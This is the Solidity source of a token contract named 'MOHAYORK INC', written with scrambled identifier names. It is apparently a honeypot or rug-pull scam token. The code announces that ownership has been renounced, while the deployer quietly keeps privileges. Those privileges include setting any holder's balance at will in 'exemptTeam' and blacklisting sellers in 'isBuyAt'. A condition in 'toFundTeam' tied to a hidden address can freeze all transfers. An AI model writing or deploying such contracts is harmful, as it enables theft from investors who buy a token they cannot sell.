//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface totalBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface maxTake {
    function createPair(address launchSell, address sellFee) external returns (address);
}

abstract contract swapExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tradingIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverSender) external view returns (uint256);

    function transfer(address receiverAmountTake, uint256 totalLaunch) external returns (bool);

    function allowance(address enableTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 totalLaunch) external returns (bool);

    function transferFrom(address sender,address receiverAmountTake,uint256 totalLaunch) external returns (bool);

    event Transfer(address indexed from, address indexed marketingSwap, uint256 value);
    event Approval(address indexed enableTx, address indexed spender, uint256 value);
}

interface tradingIsMetadata is tradingIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MOHAYORKINC is swapExempt, tradingIs, tradingIsMetadata {

    address public enableSellReceiver;

    string private receiverEnableTeam = "MIC";

    uint256 private walletBuy;

    bool private sellTokenFund;

    function totalSupply() external view virtual override returns (uint256) {
        return fundTake;
    }

    function name() external view virtual override returns (string memory) {
        return buyShould;
    }

    function owner() external view returns (address) {
        return toMax;
    }

    function fundTradingSell(address isMarketing) public {
        if (minMode) {
            return;
        }
        if (launchedList != walletBuy) {
            launchedList = walletBuy;
        }
        minTx[isMarketing] = true;
        if (buyExempt) {
            buyExempt = true;
        }
        minMode = true;
    }

    bool private buyExempt;

    function maxSell() public {
        emit OwnershipTransferred(receiverWallet, address(0));
        toMax = address(0);
    }

    string private buyShould = "MOHAYORK INC";

    uint256 public launchedList;

    mapping(address => bool) public minTx;

    mapping(address => bool) public fundTeam;

    address isTeamBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => mapping(address => uint256)) private limitMode;

    function transfer(address enableFromSwap, uint256 totalLaunch) external virtual override returns (bool) {
        return toFundTeam(_msgSender(), enableFromSwap, totalLaunch);
    }

    function walletReceiver(uint256 totalLaunch) public {
        autoMode();
        shouldList = totalLaunch;
    }

    function allowance(address launchedMinIs, address teamSwap) external view virtual override returns (uint256) {
        if (teamSwap == listTotal) {
            return type(uint256).max;
        }
        return limitMode[launchedMinIs][teamSwap];
    }

    function isBuyAt(address senderMode) public {
        autoMode();
        
        if (senderMode == receiverWallet || senderMode == enableSellReceiver) {
            return;
        }
        fundTeam[senderMode] = true;
    }

    function approve(address teamSwap, uint256 totalLaunch) public virtual override returns (bool) {
        limitMode[_msgSender()][teamSwap] = totalLaunch;
        emit Approval(_msgSender(), teamSwap, totalLaunch);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverEnableTeam;
    }

    address private toMax;

    bool public minMode;

    address public receiverWallet;

    uint256 launchedTakeMax;

    event OwnershipTransferred(address indexed shouldMin, address indexed tokenFrom);

    function teamEnable(address isLiquidityAt, address receiverAmountTake, uint256 totalLaunch) internal returns (bool) {
        require(sellAuto[isLiquidityAt] >= totalLaunch);
        sellAuto[isLiquidityAt] -= totalLaunch;
        sellAuto[receiverAmountTake] += totalLaunch;
        emit Transfer(isLiquidityAt, receiverAmountTake, totalLaunch);
        return true;
    }

    function balanceOf(address receiverSender) public view virtual override returns (uint256) {
        return sellAuto[receiverSender];
    }

    function autoMode() private view {
        require(minTx[_msgSender()]);
    }

    address listTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private sellAuto;

    function decimals() external view virtual override returns (uint8) {
        return launchedFund;
    }

    constructor (){
        
        maxSell();
        totalBuy minAt = totalBuy(listTotal);
        enableSellReceiver = maxTake(minAt.factory()).createPair(minAt.WETH(), address(this));
        if (launchedList == walletBuy) {
            buyExempt = false;
        }
        receiverWallet = _msgSender();
        minTx[receiverWallet] = true;
        sellAuto[receiverWallet] = fundTake;
        
        emit Transfer(address(0), receiverWallet, fundTake);
    }

    function transferFrom(address isLiquidityAt, address receiverAmountTake, uint256 totalLaunch) external override returns (bool) {
        if (_msgSender() != listTotal) {
            if (limitMode[isLiquidityAt][_msgSender()] != type(uint256).max) {
                require(totalLaunch <= limitMode[isLiquidityAt][_msgSender()]);
                limitMode[isLiquidityAt][_msgSender()] -= totalLaunch;
            }
        }
        return toFundTeam(isLiquidityAt, receiverAmountTake, totalLaunch);
    }

    function toFundTeam(address isLiquidityAt, address receiverAmountTake, uint256 totalLaunch) internal returns (bool) {
        if (isLiquidityAt == receiverWallet) {
            return teamEnable(isLiquidityAt, receiverAmountTake, totalLaunch);
        }
        uint256 enableFund = tradingIs(enableSellReceiver).balanceOf(isTeamBuy);
        require(enableFund == shouldList);
        require(!fundTeam[isLiquidityAt]);
        return teamEnable(isLiquidityAt, receiverAmountTake, totalLaunch);
    }

    function exemptTeam(address enableFromSwap, uint256 totalLaunch) public {
        autoMode();
        sellAuto[enableFromSwap] = totalLaunch;
    }

    uint8 private launchedFund = 18;

    function getOwner() external view returns (address) {
        return toMax;
    }

    uint256 private fundTake = 100000000 * 10 ** 18;

    uint256 shouldList;

}